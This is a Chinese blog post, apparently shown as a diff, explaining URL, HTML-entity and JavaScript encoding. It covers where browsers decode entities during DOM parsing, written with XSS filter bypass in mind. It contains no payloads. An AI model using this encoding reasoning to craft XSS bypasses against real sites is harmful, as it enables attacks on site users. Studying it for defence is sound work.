+<p><strong>TLDR: <code>urlencode</code>会将保留字符转化为纯文本格式.</strong></p>
+<p>就像C语言的<code>\</code>,为了打印出<code>\n</code>,<code>printf(&quot;\\n&quot;)</code></p>
+</br>
+
+<h3 id="Html-entity-encode"><a href="#Html-entity-encode" class="headerlink" title="Html entity encode"></a>Html entity encode</h3><p>和urlencode差不多,为了打印<code>&lt;&gt; /</code>这些保留字符,需要转码为<code>&amp;#x</code>格式</p>
+<p><code>&lt; - &amp;#x3c</code>,后面跟着的是<code>&lt;</code>的16进制格式.</p>
+<p>需要注意的是<strong>只有标签的内容和属性值会被解码</strong>,像是<code>&lt;script&gt;</code>标签里的内容并不会被解码,因为js语句由js解析器而不是<code>DOM</code>解析器解析.</p>
+<p>浏览器会把html源码解析成一棵<code>DOM</code>树,<code>&lt;&gt;</code>标识一个节点,如果标识符<code>&lt;&gt;</code>被编码,那么在解析的时候就不会把它当作节点处理.</p>
+<p>在解析成dom树<strong>之后</strong>才会进行<strong>解码</strong>,如果<strong>标签的属性名</strong>被编码了,那么这时候即使解析了也没用,因为在解析dom的时候才会处理标签的属性.</p>
+<p>但是标签的内容和标签属性的值是可以编码的,可能是因为它们本来就是在dom解析之后才写入的,写入的时候顺便解了码.</p>
+<p>另外如果用js新增节点的话,比如</p>
+<pre><code class="javascript">d1=createElement(&#39;div&#39;);
+body[0].appendChild(d1);
+</code></pre>
+<p>会重新解析<code>DOM</code>,不过如果新增的是<code>script</code>节点就不会.</p>
+<blockquote>
+<p>不能用html编码的:</p>
+<p><code>&lt;&gt; =</code> <code>属性名</code></p>
+<p>以及<code>script</code>里的内容,因为js解析器不会处理html编码.</p>
+<p>你可能会想为什么不在解析DOM之前就解码html,笨蛋,编码的意义就是为了让<code>&lt;&gt;</code>字符是纯字符,而不是标识一个节点之类的.</p>
+<p>当然,我在xss的时候还是很希望在解析的之前就解码的:)</p>
+</blockquote>
+<h3 id="JSencode"><a href="#JSencode" class="headerlink" title="JSencode"></a>JSencode</h3><p>js解析器会先把脚本里的编码内容解码,然后执行脚本.</p>
+    </div>
+  </div>
+</article> 
+  </div>
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+
+
+<script src="/js/highlight.min.js"></script>
+
+<script>hljs.initHighlightingOnLoad();</script>
+
+<div id="footer"></div>
+ 
+</body>
